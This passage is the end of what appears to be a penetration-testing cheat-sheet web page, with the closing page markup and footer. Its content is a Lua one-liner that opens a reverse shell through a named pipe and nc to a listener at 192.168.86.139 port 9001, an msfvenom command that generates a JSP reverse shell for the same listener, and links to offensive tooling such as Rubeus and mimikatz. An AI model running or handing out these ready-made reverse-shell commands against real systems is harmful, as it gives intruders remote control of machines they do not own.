+</span></span><span class=line><span class=cl>lua -e &#39;os.system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.86.139 9001 &gt;/tmp/f&#34;)&#39;
+</span></span></code></pre></td></tr></table></div></div><a href=#jsp-reverse-shell><h3 id=jsp-reverse-shell><span class=hanchor arialabel=Anchor># </span>jsp reverse shell</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Msfvenom =&gt; msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.86.139 LPORT=9001 -f raw &gt; shell.jsp
+</span></span></code></pre></td></tr></table></div></div><a href=#references-1><h1 id=references-1><span class=hanchor arialabel=Anchor># </span>References</h1></a><ul><li><a href=https://www.harmj0y.net/ rel=noopener>https://www.harmj0y.net/</a></li><li><a href=https://www.labofapenetrationtester.com/ rel=noopener>https://www.labofapenetrationtester.com/</a></li><li><a href=https://ired.team rel=noopener>https://ired.team</a></li><li><a href=https://github.com/GhostPack/Rubeus rel=noopener>https://github.com/GhostPack/Rubeus</a></li><li><a href=https://github.com/gentilkiwi/mimikatz/wiki rel=noopener>https://github.com/gentilkiwi/mimikatz/wiki</a></li></ul></article><hr><div class=page-end><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://quartz.jzhao.xyz/js/graph.afdb02e537635f9a611b53a988e5645b.js></script></div></div><div id=contact_buttons><footer><p>Made by Jacky Zhao using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2022</p><ul><li><a href=/>Home</a></li><li><a href=https://twitter.com/_jzhao>Twitter</a></li><li><a href=https://github.com/jackyzha0>Github</a></li></ul></footer></div></div></body></html>
